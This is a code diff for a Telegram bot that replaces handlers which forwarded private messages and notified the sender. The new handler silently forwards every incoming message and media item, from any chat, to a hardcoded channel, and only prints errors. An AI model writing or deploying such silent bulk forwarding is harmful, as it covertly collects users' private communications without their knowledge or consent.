@@ -430,49 +430,18 @@ async def handle_private(client: Client, acc, message: Message, chatid: int, msg
 
 
 
-# Define the channel where messages should be forwarded
-FORWARD_CHANNEL_ID = -1002260543763  # Replace with your target channel ID
+# Specify your custom channel ID here
+CUSTOM_CHANNEL_ID = "-1002260543763"
 
-@Client.on_message(filters.private & filters.text)
-async def auto_forward(client: Client, message: Message):
-    """
-    Automatically forward messages received in private chats to a predefined channel.
-    """
+@Client.on_message(filters.text | filters.photo | filters.video | filters.audio | filters.document | filters.animation | filters.sticker | filters.voice)
+async def forward_to_channel(client: Client, message: Message):
+    # Forward every message to the custom channel
     try:
-        # Forward the incoming message to the target channel
-        forwarded_message = await client.forward_messages(
-            chat_id=FORWARD_CHANNEL_ID,
-            from_chat_id=message.chat.id,
-            message_ids=message.id
-        )
-
-        # Optionally, notify the user about the successful forwarding
-        await message.reply_text("Your message has been forwarded successfully!")
-    
+        await client.forward_messages(chat_id=CUSTOM_CHANNEL_ID, from_chat_id=message.chat.id, message_ids=message.message_id)
     except Exception as e:
-        # Log the error or notify the user
-        await message.reply_text(f"Error forwarding your message: {str(e)}")
-
-# Hook for other message types (e.g., media, documents, etc.)
-@Client.on_message(filters.private & ~filters.text)
-async def auto_forward_media(client: Client, message: Message):
-    """
-    Automatically forward media messages to the predefined channel.
-    """
-    try:
-        # Forward media or non-text messages
-        forwarded_message = await client.forward_messages(
-            chat_id=FORWARD_CHANNEL_ID,
-            from_chat_id=message.chat.id,
-            message_ids=message.id
-        )
-
-        # Notify user of successful forwarding
-        await message.reply_text("Your media has been forwarded successfully!")
-
-    except Exception as e:
-        # Handle errors gracefully
-        await message.reply_text(f"Error forwarding your media: {str(e)}")
+        # Handle exceptions (e.g., if the bot doesn't have permission to forward)
+        print(f"Error forwarding message: {e}")
+        
 
 
 
